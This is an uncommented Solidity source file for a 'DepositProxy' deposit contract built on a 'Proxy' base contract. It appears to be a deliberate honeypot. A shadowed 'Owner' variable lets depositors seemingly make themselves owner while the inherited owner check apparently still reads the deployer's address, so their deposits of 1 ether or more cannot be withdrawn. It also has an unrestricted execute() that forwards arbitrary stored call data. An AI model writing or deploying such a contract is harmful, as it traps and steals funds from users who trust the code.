pragma solidity ^0.4.20;

contract Proxy  {
    address public Owner = msg.sender;
    address public Proxy = 0x0;
    bytes data;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; }
    function proxy(address _proxy) onlyOwner { Proxy = _proxy; }
    function () payable { data = msg.data; }
    function execute() returns (bool) { return Proxy.call(data); }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint) public Deposits;

    event Deposited(address who, uint amount);
    event Withdrawn(address who, uint amount);
    
    function Deposit() payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }

    function deposit() payable {
        if (msg.value >= 1 ether) {
            Deposits[msg.sender] += msg.value;
            Deposited(msg.sender, msg.value);
        }
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
            Withdrawn(msg.sender, amount);
        }
    }
}